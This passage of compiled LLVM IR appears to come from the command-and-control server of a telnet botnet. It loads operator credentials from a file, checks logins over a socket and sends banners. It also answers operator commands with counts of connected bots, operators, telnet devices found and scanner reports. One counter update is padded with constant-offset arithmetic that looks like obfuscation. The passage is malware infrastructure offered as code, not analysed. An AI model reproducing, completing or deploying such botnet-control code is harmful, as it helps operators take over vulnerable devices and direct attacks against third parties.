  %110 = getelementptr inbounds [22 x %struct.login_info], [22 x %struct.login_info]* @accounts, i64 0, i64 %109
  %111 = getelementptr inbounds %struct.login_info, %struct.login_info* %110, i32 0, i32 0
  %112 = getelementptr inbounds [20 x i8], [20 x i8]* %111, i32 0, i32 0
  %113 = load i32, i32* %14, align 4
  %114 = sext i32 %113 to i64
  %115 = getelementptr inbounds [22 x %struct.login_info], [22 x %struct.login_info]* @accounts, i64 0, i64 %114
  %116 = getelementptr inbounds %struct.login_info, %struct.login_info* %115, i32 0, i32 1
  %117 = getelementptr inbounds [20 x i8], [20 x i8]* %116, i32 0, i32 0
  %118 = call i32 (%struct._IO_FILE*, i8*, ...) @__isoc99_fscanf(%struct._IO_FILE* %107, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.20, i32 0, i32 0), i8* %112, i8* %117)
  %119 = load i32, i32* %14, align 4
  %120 = add i32 %119, 983803406
  %121 = add i32 %120, 1
  %122 = sub i32 %121, 983803406
  %123 = add nsw i32 %119, 1
  store i32 %122, i32* %14, align 4
  br label %98

; <label>:124:                                    ; preds = %98
  %125 = load i32, i32* %4, align 4
  %126 = call i64 @send(i32 %125, i8* getelementptr inbounds ([22 x i8], [22 x i8]* @.str.21, i32 0, i32 0), i64 22, i32 16384)
  %127 = icmp eq i64 %126, -1
  br i1 %127, label %128, label %129

; <label>:128:                                    ; preds = %124
  br label %878

; <label>:129:                                    ; preds = %124
  %130 = getelementptr inbounds [2048 x i8], [2048 x i8]* %7, i32 0, i32 0
  %131 = load i32, i32* %4, align 4
  %132 = call i32 @fdgets(i8* %130, i32 2048, i32 %131)
  %133 = icmp slt i32 %132, 1
  br i1 %133, label %134, label %135

; <label>:134:                                    ; preds = %129
  br label %878

; <label>:135:                                    ; preds = %129
  %136 = getelementptr inbounds [2048 x i8], [2048 x i8]* %7, i32 0, i32 0
  call void @trim(i8* %136)
  %137 = load i32, i32* %5, align 4
  %138 = sext i32 %137 to i64
  %139 = getelementptr inbounds [22 x %struct.login_info], [22 x %struct.login_info]* @accounts, i64 0, i64 %138
  %140 = getelementptr inbounds %struct.login_info, %struct.login_info* %139, i32 0, i32 0
  %141 = getelementptr inbounds [20 x i8], [20 x i8]* %140, i32 0, i32 0
  %142 = getelementptr inbounds [2048 x i8], [2048 x i8]* %7, i32 0, i32 0
  %143 = call i32 (i8*, i8*, ...) @sprintf(i8* %141, i8* %142) #7
  %144 = getelementptr inbounds [2048 x i8], [2048 x i8]* %7, i32 0, i32 0
  store i8* %144, i8** %15, align 8
  %145 = load i8*, i8** %15, align 8
  %146 = call i32 @Find_Login(i8* %145)
  store i32 %146, i32* %5, align 4
  %147 = load i8*, i8** %15, align 8
  %148 = load i32, i32* %5, align 4
  %149 = sext i32 %148 to i64
  %150 = getelementptr inbounds [22 x %struct.login_info], [22 x %struct.login_info]* @accounts, i64 0, i64 %149
  %151 = getelementptr inbounds %struct.login_info, %struct.login_info* %150, i32 0, i32 0
  %152 = getelementptr inbounds [20 x i8], [20 x i8]* %151, i32 0, i32 0
  %153 = call i32 @strcmp(i8* %147, i8* %152) #8
  %154 = icmp eq i32 %153, 0
  br i1 %154, label %155, label %179

; <label>:155:                                    ; preds = %135
  %156 = load i32, i32* %4, align 4
  %157 = call i64 @send(i32 %156, i8* getelementptr inbounds ([22 x i8], [22 x i8]* @.str.23, i32 0, i32 0), i64 22, i32 16384)
  %158 = icmp eq i64 %157, -1
  br i1 %158, label %159, label %160

; <label>:159:                                    ; preds = %155
  br label %878

; <label>:160:                                    ; preds = %155
  %161 = getelementptr inbounds [2048 x i8], [2048 x i8]* %7, i32 0, i32 0
  %162 = load i32, i32* %4, align 4
  %163 = call i32 @fdgets(i8* %161, i32 2048, i32 %162)
  %164 = icmp slt i32 %163, 1
  br i1 %164, label %165, label %166

; <label>:165:                                    ; preds = %160
  br label %878

; <label>:166:                                    ; preds = %160
  %167 = getelementptr inbounds [2048 x i8], [2048 x i8]* %7, i32 0, i32 0
  call void @trim(i8* %167)
  %168 = getelementptr inbounds [2048 x i8], [2048 x i8]* %7, i32 0, i32 0
  %169 = load i32, i32* %5, align 4
  %170 = sext i32 %169 to i64
  %171 = getelementptr inbounds [22 x %struct.login_info], [22 x %struct.login_info]* @accounts, i64 0, i64 %170
  %172 = getelementptr inbounds %struct.login_info, %struct.login_info* %171, i32 0, i32 1
  %173 = getelementptr inbounds [20 x i8], [20 x i8]* %172, i32 0, i32 0
  %174 = call i32 @strcmp(i8* %168, i8* %173) #8
  %175 = icmp ne i32 %174, 0
  br i1 %175, label %176, label %177

; <label>:176:                                    ; preds = %166
  br label %180

; <label>:177:                                    ; preds = %166
  %178 = getelementptr inbounds [2048 x i8], [2048 x i8]* %7, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %178, i8 0, i64 2048, i32 16, i1 false)
  br label %197

; <label>:179:                                    ; preds = %135
  br label %180

; <label>:180:                                    ; preds = %179, %176
  %181 = load i32, i32* %4, align 4
  %182 = call i64 @send(i32 %181, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.24, i32 0, i32 0), i64 5, i32 16384)
  %183 = icmp eq i64 %182, -1
  br i1 %183, label %184, label %185

; <label>:184:                                    ; preds = %180
  br label %878

; <label>:185:                                    ; preds = %180
  %186 = getelementptr inbounds [80 x i8], [80 x i8]* %16, i32 0, i32 0
  %187 = call i32 (i8*, i8*, ...) @sprintf(i8* %186, i8* getelementptr inbounds ([48 x i8], [48 x i8]* @.str.25, i32 0, i32 0)) #7
  %188 = load i32, i32* %4, align 4
  %189 = getelementptr inbounds [80 x i8], [80 x i8]* %16, i32 0, i32 0
  %190 = getelementptr inbounds [80 x i8], [80 x i8]* %16, i32 0, i32 0
  %191 = call i64 @strlen(i8* %190) #8
  %192 = call i64 @send(i32 %188, i8* %189, i64 %191, i32 16384)
  %193 = icmp eq i64 %192, -1
  br i1 %193, label %194, label %195

; <label>:194:                                    ; preds = %185
  br label %878

; <label>:195:                                    ; preds = %185
  %196 = call i32 @sleep(i32 5)
  br label %878

; <label>:197:                                    ; preds = %177
  %198 = load i8*, i8** %3, align 8
  %199 = call i32 @pthread_create(i64* %6, %union.pthread_attr_t* null, i8* (i8*)* @TitleWriter, i8* %198) #7
  %200 = getelementptr inbounds [2048 x i8], [2048 x i8]* %27, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %200, i8 0, i64 2048, i32 16, i1 false)
  %201 = getelementptr inbounds [5000 x i8], [5000 x i8]* %17, i32 0, i32 0
  %202 = call i32 (i8*, i8*, ...) @sprintf(i8* %201, i8* getelementptr inbounds ([92 x i8], [92 x i8]* @.str.26, i32 0, i32 0)) #7
  %203 = getelementptr inbounds [5000 x i8], [5000 x i8]* %18, i32 0, i32 0
  %204 = call i32 (i8*, i8*, ...) @sprintf(i8* %203, i8* getelementptr inbounds ([92 x i8], [92 x i8]* @.str.27, i32 0, i32 0)) #7
  %205 = getelementptr inbounds [5000 x i8], [5000 x i8]* %19, i32 0, i32 0
  %206 = call i32 (i8*, i8*, ...) @sprintf(i8* %205, i8* getelementptr inbounds ([92 x i8], [92 x i8]* @.str.28, i32 0, i32 0)) #7
  %207 = getelementptr inbounds [5000 x i8], [5000 x i8]* %20, i32 0, i32 0
  %208 = call i32 (i8*, i8*, ...) @sprintf(i8* %207, i8* getelementptr inbounds ([92 x i8], [92 x i8]* @.str.29, i32 0, i32 0)) #7
  %209 = getelementptr inbounds [5000 x i8], [5000 x i8]* %21, i32 0, i32 0
  %210 = call i32 (i8*, i8*, ...) @sprintf(i8* %209, i8* getelementptr inbounds ([92 x i8], [92 x i8]* @.str.30, i32 0, i32 0)) #7
  %211 = getelementptr inbounds [5000 x i8], [5000 x i8]* %22, i32 0, i32 0
  %212 = call i32 (i8*, i8*, ...) @sprintf(i8* %211, i8* getelementptr inbounds ([92 x i8], [92 x i8]* @.str.31, i32 0, i32 0)) #7
  %213 = getelementptr inbounds [5000 x i8], [5000 x i8]* %23, i32 0, i32 0
  %214 = call i32 (i8*, i8*, ...) @sprintf(i8* %213, i8* getelementptr inbounds ([158 x i8], [158 x i8]* @.str.32, i32 0, i32 0)) #7
  %215 = getelementptr inbounds [5000 x i8], [5000 x i8]* %24, i32 0, i32 0
  %216 = call i32 (i8*, i8*, ...) @sprintf(i8* %215, i8* getelementptr inbounds ([82 x i8], [82 x i8]* @.str.33, i32 0, i32 0)) #7
  %217 = getelementptr inbounds [5000 x i8], [5000 x i8]* %25, i32 0, i32 0
  %218 = call i32 (i8*, i8*, ...) @sprintf(i8* %217, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.34, i32 0, i32 0)) #7
  %219 = getelementptr inbounds [80 x i8], [80 x i8]* %26, i32 0, i32 0
  %220 = load i32, i32* %5, align 4
  %221 = sext i32 %220 to i64
  %222 = getelementptr inbounds [22 x %struct.login_info], [22 x %struct.login_info]* @accounts, i64 0, i64 %221
  %223 = getelementptr inbounds %struct.login_info, %struct.login_info* %222, i32 0, i32 0
  %224 = getelementptr inbounds [20 x i8], [20 x i8]* %223, i32 0, i32 0
  %225 = call i32 (i8*, i8*, ...) @sprintf(i8* %219, i8* getelementptr inbounds ([74 x i8], [74 x i8]* @.str.35, i32 0, i32 0), i8* %224) #7
  %226 = getelementptr inbounds [2048 x i8], [2048 x i8]* %27, i32 0, i32 0
  %227 = call i32 (i8*, i8*, ...) @sprintf(i8* %226, i8* getelementptr inbounds ([84 x i8], [84 x i8]* @.str.36, i32 0, i32 0)) #7
  %228 = load i32, i32* %4, align 4
  %229 = getelementptr inbounds [5000 x i8], [5000 x i8]* %17, i32 0, i32 0
  %230 = getelementptr inbounds [5000 x i8], [5000 x i8]* %17, i32 0, i32 0
  %231 = call i64 @strlen(i8* %230) #8
  %232 = call i64 @send(i32 %228, i8* %229, i64 %231, i32 16384)
  %233 = icmp eq i64 %232, -1
  br i1 %233, label %234, label %235

; <label>:234:                                    ; preds = %197
  br label %878

; <label>:235:                                    ; preds = %197
  %236 = load i32, i32* %4, align 4
  %237 = getelementptr inbounds [5000 x i8], [5000 x i8]* %18, i32 0, i32 0
  %238 = getelementptr inbounds [5000 x i8], [5000 x i8]* %18, i32 0, i32 0
  %239 = call i64 @strlen(i8* %238) #8
  %240 = call i64 @send(i32 %236, i8* %237, i64 %239, i32 16384)
  %241 = icmp eq i64 %240, -1
  br i1 %241, label %242, label %243

; <label>:242:                                    ; preds = %235
  br label %878

; <label>:243:                                    ; preds = %235
  %244 = load i32, i32* %4, align 4
  %245 = getelementptr inbounds [5000 x i8], [5000 x i8]* %19, i32 0, i32 0
  %246 = getelementptr inbounds [5000 x i8], [5000 x i8]* %19, i32 0, i32 0
  %247 = call i64 @strlen(i8* %246) #8
  %248 = call i64 @send(i32 %244, i8* %245, i64 %247, i32 16384)
  %249 = icmp eq i64 %248, -1
  br i1 %249, label %250, label %251

; <label>:250:                                    ; preds = %243
  br label %878

; <label>:251:                                    ; preds = %243
  %252 = load i32, i32* %4, align 4
  %253 = getelementptr inbounds [5000 x i8], [5000 x i8]* %20, i32 0, i32 0
  %254 = getelementptr inbounds [5000 x i8], [5000 x i8]* %20, i32 0, i32 0
  %255 = call i64 @strlen(i8* %254) #8
  %256 = call i64 @send(i32 %252, i8* %253, i64 %255, i32 16384)
  %257 = icmp eq i64 %256, -1
  br i1 %257, label %258, label %259

; <label>:258:                                    ; preds = %251
  br label %878

; <label>:259:                                    ; preds = %251
  %260 = load i32, i32* %4, align 4
  %261 = getelementptr inbounds [5000 x i8], [5000 x i8]* %21, i32 0, i32 0
  %262 = getelementptr inbounds [5000 x i8], [5000 x i8]* %21, i32 0, i32 0
  %263 = call i64 @strlen(i8* %262) #8
  %264 = call i64 @send(i32 %260, i8* %261, i64 %263, i32 16384)
  %265 = icmp eq i64 %264, -1
  br i1 %265, label %266, label %267

; <label>:266:                                    ; preds = %259
  br label %878

; <label>:267:                                    ; preds = %259
  %268 = load i32, i32* %4, align 4
  %269 = getelementptr inbounds [5000 x i8], [5000 x i8]* %22, i32 0, i32 0
  %270 = getelementptr inbounds [5000 x i8], [5000 x i8]* %22, i32 0, i32 0
  %271 = call i64 @strlen(i8* %270) #8
  %272 = call i64 @send(i32 %268, i8* %269, i64 %271, i32 16384)
  %273 = icmp eq i64 %272, -1
  br i1 %273, label %274, label %275

; <label>:274:                                    ; preds = %267
  br label %878

; <label>:275:                                    ; preds = %267
  %276 = load i32, i32* %4, align 4
  %277 = getelementptr inbounds [5000 x i8], [5000 x i8]* %23, i32 0, i32 0
  %278 = getelementptr inbounds [5000 x i8], [5000 x i8]* %23, i32 0, i32 0
  %279 = call i64 @strlen(i8* %278) #8
  %280 = call i64 @send(i32 %276, i8* %277, i64 %279, i32 16384)
  %281 = icmp eq i64 %280, -1
  br i1 %281, label %282, label %283

; <label>:282:                                    ; preds = %275
  br label %878

; <label>:283:                                    ; preds = %275
  %284 = load i32, i32* %4, align 4
  %285 = getelementptr inbounds [5000 x i8], [5000 x i8]* %24, i32 0, i32 0
  %286 = getelementptr inbounds [5000 x i8], [5000 x i8]* %24, i32 0, i32 0
  %287 = call i64 @strlen(i8* %286) #8
  %288 = call i64 @send(i32 %284, i8* %285, i64 %287, i32 16384)
  %289 = icmp eq i64 %288, -1
  br i1 %289, label %290, label %291

; <label>:290:                                    ; preds = %283
  br label %878

; <label>:291:                                    ; preds = %283
  %292 = load i32, i32* %4, align 4
  %293 = getelementptr inbounds [5000 x i8], [5000 x i8]* %25, i32 0, i32 0
  %294 = getelementptr inbounds [5000 x i8], [5000 x i8]* %25, i32 0, i32 0
  %295 = call i64 @strlen(i8* %294) #8
  %296 = call i64 @send(i32 %292, i8* %293, i64 %295, i32 16384)
  %297 = icmp eq i64 %296, -1
  br i1 %297, label %298, label %299

; <label>:298:                                    ; preds = %291
  br label %878

; <label>:299:                                    ; preds = %291
  %300 = load i32, i32* %4, align 4
  %301 = getelementptr inbounds [80 x i8], [80 x i8]* %26, i32 0, i32 0
  %302 = getelementptr inbounds [80 x i8], [80 x i8]* %26, i32 0, i32 0
  %303 = call i64 @strlen(i8* %302) #8
  %304 = call i64 @send(i32 %300, i8* %301, i64 %303, i32 16384)
  %305 = icmp eq i64 %304, -1
  br i1 %305, label %306, label %307

; <label>:306:                                    ; preds = %299
  br label %878

; <label>:307:                                    ; preds = %299
  br label %308

; <label>:308:                                    ; preds = %307
  %309 = load i32, i32* %4, align 4
  %310 = getelementptr inbounds [2048 x i8], [2048 x i8]* %27, i32 0, i32 0
  %311 = getelementptr inbounds [2048 x i8], [2048 x i8]* %27, i32 0, i32 0
  %312 = call i64 @strlen(i8* %311) #8
  %313 = call i64 @send(i32 %309, i8* %310, i64 %312, i32 16384)
  %314 = icmp eq i64 %313, -1
  br i1 %314, label %315, label %316

; <label>:315:                                    ; preds = %308
  br label %878

; <label>:316:                                    ; preds = %308
  %317 = load i32, i32* %4, align 4
  %318 = call i64 @send(i32 %317, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.37, i32 0, i32 0), i64 12, i32 16384)
  %319 = icmp eq i64 %318, -1
  br i1 %319, label %320, label %321

; <label>:320:                                    ; preds = %316
  br label %878

; <label>:321:                                    ; preds = %316
  br label %322

; <label>:322:                                    ; preds = %321
  %323 = load i8*, i8** %3, align 8
  %324 = call i32 @pthread_create(i64* %6, %union.pthread_attr_t* null, i8* (i8*)* @TitleWriter, i8* %323) #7
  %325 = load i32, i32* %4, align 4
  %326 = sext i32 %325 to i64
  %327 = getelementptr inbounds [1000000 x %struct.telnetdata_t], [1000000 x %struct.telnetdata_t]* @managements, i64 0, i64 %326
  %328 = getelementptr inbounds %struct.telnetdata_t, %struct.telnetdata_t* %327, i32 0, i32 0
  store i32 1, i32* %328, align 4
  br label %329

; <label>:329:                                    ; preds = %844, %843, %810, %786, %762, %651, %630, %566, %379, %356, %322
  %330 = getelementptr inbounds [2048 x i8], [2048 x i8]* %7, i32 0, i32 0
  %331 = load i32, i32* %4, align 4
  %332 = call i32 @fdgets(i8* %330, i32 2048, i32 %331)
  %333 = icmp sgt i32 %332, 0
  br i1 %333, label %334, label %877

; <label>:334:                                    ; preds = %329
  %335 = getelementptr inbounds [2048 x i8], [2048 x i8]* %7, i32 0, i32 0
  %336 = call i8* @strstr(i8* %335, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.38, i32 0, i32 0)) #8
  %337 = icmp ne i8* %336, null
  br i1 %337, label %338, label %357

; <label>:338:                                    ; preds = %334
  %339 = getelementptr inbounds [2048 x i8], [2048 x i8]* %28, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %339, i8 0, i64 2048, i32 16, i1 false)
  %340 = getelementptr inbounds [2048 x i8], [2048 x i8]* %28, i32 0, i32 0
  %341 = call i32 @BotsConnected()
  %342 = load volatile i32, i32* @OperatorsConnected, align 4
  %343 = call i32 (i8*, i8*, ...) @sprintf(i8* %340, i8* getelementptr inbounds ([68 x i8], [68 x i8]* @.str.39, i32 0, i32 0), i32 %341, i32 %342) #7
  %344 = load i32, i32* %4, align 4
  %345 = getelementptr inbounds [2048 x i8], [2048 x i8]* %28, i32 0, i32 0
  %346 = getelementptr inbounds [2048 x i8], [2048 x i8]* %28, i32 0, i32 0
  %347 = call i64 @strlen(i8* %346) #8
  %348 = call i64 @send(i32 %344, i8* %345, i64 %347, i32 16384)
  %349 = icmp eq i64 %348, -1
  br i1 %349, label %350, label %351

; <label>:350:                                    ; preds = %338
  store i8* null, i8** %2, align 8
  br label %890

; <label>:351:                                    ; preds = %338
  %352 = load i32, i32* %4, align 4
  %353 = call i64 @send(i32 %352, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.37, i32 0, i32 0), i64 12, i32 16384)
  %354 = icmp eq i64 %353, -1
  br i1 %354, label %355, label %356

; <label>:355:                                    ; preds = %351
  br label %878

; <label>:356:                                    ; preds = %351
  br label %329

; <label>:357:                                    ; preds = %334
  %358 = getelementptr inbounds [2048 x i8], [2048 x i8]* %7, i32 0, i32 0
  %359 = call i8* @strstr(i8* %358, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.40, i32 0, i32 0)) #8
  %360 = icmp ne i8* %359, null
  br i1 %360, label %361, label %380

; <label>:361:                                    ; preds = %357
  %362 = getelementptr inbounds [2048 x i8], [2048 x i8]* %29, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %362, i8 0, i64 2048, i32 16, i1 false)
  %363 = getelementptr inbounds [2048 x i8], [2048 x i8]* %29, i32 0, i32 0
  %364 = load volatile i32, i32* @TELFound, align 4
  %365 = load volatile i32, i32* @scannerreport, align 4
  %366 = call i32 (i8*, i8*, ...) @sprintf(i8* %363, i8* getelementptr inbounds ([62 x i8], [62 x i8]* @.str.41, i32 0, i32 0), i32 %364, i32 %365) #7
  %367 = load i32, i32* %4, align 4
  %368 = getelementptr inbounds [2048 x i8], [2048 x i8]* %29, i32 0, i32 0
  %369 = getelementptr inbounds [2048 x i8], [2048 x i8]* %29, i32 0, i32 0
  %370 = call i64 @strlen(i8* %369) #8
  %371 = call i64 @send(i32 %367, i8* %368, i64 %370, i32 16384)
  %372 = icmp eq i64 %371, -1
  br i1 %372, label %373, label %374

; <label>:373:                                    ; preds = %361
  store i8* null, i8** %2, align 8
  br label %890

; <label>:374:                                    ; preds = %361
  %375 = load i32, i32* %4, align 4
  %376 = call i64 @send(i32 %375, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.37, i32 0, i32 0), i64 12, i32 16384)
  %377 = icmp eq i64 %376, -1
  br i1 %377, label %378, label %379

; <label>:378:                                    ; preds = %374
  br label %878

; <label>:379:                                    ; preds = %374
  br label %329

; <label>:380:                                    ; preds = %357
  %381 = getelementptr inbounds [2048 x i8], [2048 x i8]* %7, i32 0, i32 0
  %382 = call i8* @strstr(i8* %381, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.42, i32 0, i32 0)) #8
  %383 = icmp ne i8* %382, null
  br i1 %383, label %384, label %567

; <label>:384:                                    ; preds = %380
  %385 = load i8*, i8** %3, align 8
  %386 = call i32 @pthread_create(i64* %6, %union.pthread_attr_t* null, i8* (i8*)* @TitleWriter, i8* %385) #7
  %387 = getelementptr inbounds [80 x i8], [80 x i8]* %30, i32 0, i32 0
  %388 = load i32, i32* %5, align 4
  %389 = sext i32 %388 to i64
  %390 = getelementptr inbounds [22 x %struct.login_info], [22 x %struct.login_info]* @accounts, i64 0, i64 %389
  %391 = getelementptr inbounds %struct.login_info, %struct.login_info* %390, i32 0, i32 0
  %392 = getelementptr inbounds [20 x i8], [20 x i8]* %391, i32 0, i32 0
  %393 = call i32 (i8*, i8*, ...) @sprintf(i8* %387, i8* getelementptr inbounds ([54 x i8], [54 x i8]* @.str.43, i32 0, i32 0), i8* %392) #7
  %394 = getelementptr inbounds [80 x i8], [80 x i8]* %31, i32 0, i32 0
  %395 = call i32 (i8*, i8*, ...) @sprintf(i8* %394, i8* getelementptr inbounds ([68 x i8], [68 x i8]* @.str.44, i32 0, i32 0)) #7
  %396 = getelementptr inbounds [80 x i8], [80 x i8]* %32, i32 0, i32 0
  %397 = call i32 (i8*, i8*, ...) @sprintf(i8* %396, i8* getelementptr inbounds ([72 x i8], [72 x i8]* @.str.45, i32 0, i32 0)) #7
  %398 = getelementptr inbounds [80 x i8], [80 x i8]* %33, i32 0, i32 0
  %399 = call i32 (i8*, i8*, ...) @sprintf(i8* %398, i8* getelementptr inbounds ([56 x i8], [56 x i8]* @.str.46, i32 0, i32 0)) #7
  %400 = getelementptr inbounds [80 x i8], [80 x i8]* %34, i32 0, i32 0
  %401 = call i32 (i8*, i8*, ...) @sprintf(i8* %400, i8* getelementptr inbounds ([60 x i8], [60 x i8]* @.str.47, i32 0, i32 0)) #7
  %402 = getelementptr inbounds [80 x i8], [80 x i8]* %36, i32 0, i32 0
  %403 = call i32 (i8*, i8*, ...) @sprintf(i8* %402, i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.48, i32 0, i32 0)) #7
  %404 = getelementptr inbounds [80 x i8], [80 x i8]* %37, i32 0, i32 0
  %405 = call i32 (i8*, i8*, ...) @sprintf(i8* %404, i8* getelementptr inbounds ([76 x i8], [76 x i8]* @.str.49, i32 0, i32 0)) #7
  %406 = getelementptr inbounds [80 x i8], [80 x i8]* %38, i32 0, i32 0
  %407 = call i32 (i8*, i8*, ...) @sprintf(i8* %406, i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.48, i32 0, i32 0)) #7
  %408 = getelementptr inbounds [80 x i8], [80 x i8]* %39, i32 0, i32 0
  %409 = call i32 (i8*, i8*, ...) @sprintf(i8* %408, i8* getelementptr inbounds ([57 x i8], [57 x i8]* @.str.50, i32 0, i32 0)) #7
  %410 = getelementptr inbounds [80 x i8], [80 x i8]* %40, i32 0, i32 0
  %411 = call i32 (i8*, i8*, ...) @sprintf(i8* %410, i8* getelementptr inbounds ([57 x i8], [57 x i8]* @.str.51, i32 0, i32 0)) #7
  %412 = getelementptr inbounds [80 x i8], [80 x i8]* %41, i32 0, i32 0
  %413 = call i32 (i8*, i8*, ...) @sprintf(i8* %412, i8* getelementptr inbounds ([57 x i8], [57 x i8]* @.str.52, i32 0, i32 0)) #7
  %414 = getelementptr inbounds [80 x i8], [80 x i8]* %42, i32 0, i32 0
  %415 = call i32 (i8*, i8*, ...) @sprintf(i8* %414, i8* getelementptr inbounds ([57 x i8], [57 x i8]* @.str.53, i32 0, i32 0)) #7
  %416 = getelementptr inbounds [80 x i8], [80 x i8]* %43, i32 0, i32 0
  %417 = call i32 (i8*, i8*, ...) @sprintf(i8* %416, i8* getelementptr inbounds ([57 x i8], [57 x i8]* @.str.54, i32 0, i32 0)) #7
  %418 = getelementptr inbounds [80 x i8], [80 x i8]* %44, i32 0, i32 0
  %419 = call i32 (i8*, i8*, ...) @sprintf(i8* %418, i8* getelementptr inbounds ([57 x i8], [57 x i8]* @.str.55, i32 0, i32 0)) #7
  %420 = getelementptr inbounds [80 x i8], [80 x i8]* %45, i32 0, i32 0
  %421 = call i32 (i8*, i8*, ...) @sprintf(i8* %420, i8* getelementptr inbounds ([57 x i8], [57 x i8]* @.str.56, i32 0, i32 0)) #7
  %422 = getelementptr inbounds [80 x i8], [80 x i8]* %46, i32 0, i32 0
  %423 = call i32 (i8*, i8*, ...) @sprintf(i8* %422, i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.48, i32 0, i32 0)) #7
  %424 = load i32, i32* %4, align 4
  %425 = getelementptr inbounds [80 x i8], [80 x i8]* %30, i32 0, i32 0
  %426 = getelementptr inbounds [80 x i8], [80 x i8]* %30, i32 0, i32 0
  %427 = call i64 @strlen(i8* %426) #8
  %428 = call i64 @send(i32 %424, i8* %425, i64 %427, i32 16384)
  %429 = icmp eq i64 %428, -1
  br i1 %429, label %430, label %431

; <label>:430:                                    ; preds = %384
  br label %878

; <label>:431:                                    ; preds = %384
  %432 = load i32, i32* %4, align 4
  %433 = getelementptr inbounds [80 x i8], [80 x i8]* %31, i32 0, i32 0
  %434 = getelementptr inbounds [80 x i8], [80 x i8]* %31, i32 0, i32 0
  %435 = call i64 @strlen(i8* %434) #8
  %436 = call i64 @send(i32 %432, i8* %433, i64 %435, i32 16384)
  %437 = icmp eq i64 %436, -1
  br i1 %437, label %438, label %439

; <label>:438:                                    ; preds = %431
  br label %878

; <label>:439:                                    ; preds = %431
  %440 = load i32, i32* %4, align 4
  %441 = getelementptr inbounds [80 x i8], [80 x i8]* %32, i32 0, i32 0
  %442 = getelementptr inbounds [80 x i8], [80 x i8]* %32, i32 0, i32 0
  %443 = call i64 @strlen(i8* %442) #8
  %444 = call i64 @send(i32 %440, i8* %441, i64 %443, i32 16384)
  %445 = icmp eq i64 %444, -1
  br i1 %445, label %446, label %447

; <label>:446:                                    ; preds = %439
  br label %878

; <label>:447:                                    ; preds = %439
  %448 = load i32, i32* %4, align 4
  %449 = getelementptr inbounds [80 x i8], [80 x i8]* %33, i32 0, i32 0
  %450 = getelementptr inbounds [80 x i8], [80 x i8]* %33, i32 0, i32 0
  %451 = call i64 @strlen(i8* %450) #8
  %452 = call i64 @send(i32 %448, i8* %449, i64 %451, i32 16384)
  %453 = icmp eq i64 %452, -1
  br i1 %453, label %454, label %455

; <label>:454:                                    ; preds = %447
  br label %878

; <label>:455:                                    ; preds = %447
  %456 = load i32, i32* %4, align 4
  %457 = getelementptr inbounds [80 x i8], [80 x i8]* %34, i32 0, i32 0
  %458 = getelementptr inbounds [80 x i8], [80 x i8]* %34, i32 0, i32 0
  %459 = call i64 @strlen(i8* %458) #8
  %460 = call i64 @send(i32 %456, i8* %457, i64 %459, i32 16384)
  %461 = icmp eq i64 %460, -1
  br i1 %461, label %462, label %463

; <label>:462:                                    ; preds = %455
  br label %878

; <label>:463:                                    ; preds = %455
  %464 = load i32, i32* %4, align 4
  %465 = getelementptr inbounds [80 x i8], [80 x i8]* %35, i32 0, i32 0
  %466 = getelementptr inbounds [80 x i8], [80 x i8]* %35, i32 0, i32 0
  %467 = call i64 @strlen(i8* %466) #8
  %468 = call i64 @send(i32 %464, i8* %465, i64 %467, i32 16384)
  %469 = icmp eq i64 %468, -1
  br i1 %469, label %470, label %471

; <label>:470:                                    ; preds = %463
  br label %878

; <label>:471:                                    ; preds = %463
  %472 = load i32, i32* %4, align 4
  %473 = getelementptr inbounds [80 x i8], [80 x i8]* %36, i32 0, i32 0
  %474 = getelementptr inbounds [80 x i8], [80 x i8]* %36, i32 0, i32 0
  %475 = call i64 @strlen(i8* %474) #8
  %476 = call i64 @send(i32 %472, i8* %473, i64 %475, i32 16384)
  %477 = icmp eq i64 %476, -1
  br i1 %477, label %478, label %479

; <label>:478:                                    ; preds = %471
  br label %878

; <label>:479:                                    ; preds = %471
  %480 = load i32, i32* %4, align 4
  %481 = getelementptr inbounds [80 x i8], [80 x i8]* %37, i32 0, i32 0
  %482 = getelementptr inbounds [80 x i8], [80 x i8]* %37, i32 0, i32 0
  %483 = call i64 @strlen(i8* %482) #8
  %484 = call i64 @send(i32 %480, i8* %481, i64 %483, i32 16384)
  %485 = icmp eq i64 %484, -1
  br i1 %485, label %486, label %487

; <label>:486:                                    ; preds = %479
  br label %878

; <label>:487:                                    ; preds = %479
  %488 = load i32, i32* %4, align 4
  %489 = getelementptr inbounds [80 x i8], [80 x i8]* %38, i32 0, i32 0
  %490 = getelementptr inbounds [80 x i8], [80 x i8]* %38, i32 0, i32 0
  %491 = call i64 @strlen(i8* %490) #8
  %492 = call i64 @send(i32 %488, i8* %489, i64 %491, i32 16384)
  %493 = icmp eq i64 %492, -1
  br i1 %493, label %494, label %495

; <label>:494:                                    ; preds = %487
  br label %878

; <label>:495:                                    ; preds = %487
  %496 = load i32, i32* %4, align 4
  %497 = getelementptr inbounds [80 x i8], [80 x i8]* %39, i32 0, i32 0
  %498 = getelementptr inbounds [80 x i8], [80 x i8]* %39, i32 0, i32 0
  %499 = call i64 @strlen(i8* %498) #8
  %500 = call i64 @send(i32 %496, i8* %497, i64 %499, i32 16384)
  %501 = icmp eq i64 %500, -1
  br i1 %501, label %502, label %503

; <label>:502:                                    ; preds = %495
  br label %878

; <label>:503:                                    ; preds = %495
  %504 = load i32, i32* %4, align 4
  %505 = getelementptr inbounds [80 x i8], [80 x i8]* %40, i32 0, i32 0
  %506 = getelementptr inbounds [80 x i8], [80 x i8]* %40, i32 0, i32 0
  %507 = call i64 @strlen(i8* %506) #8
  %508 = call i64 @send(i32 %504, i8* %505, i64 %507, i32 16384)
  %509 = icmp eq i64 %508, -1
  br i1 %509, label %510, label %511

; <label>:510:                                    ; preds = %503
  br label %878

; <label>:511:                                    ; preds = %503
  %512 = load i32, i32* %4, align 4
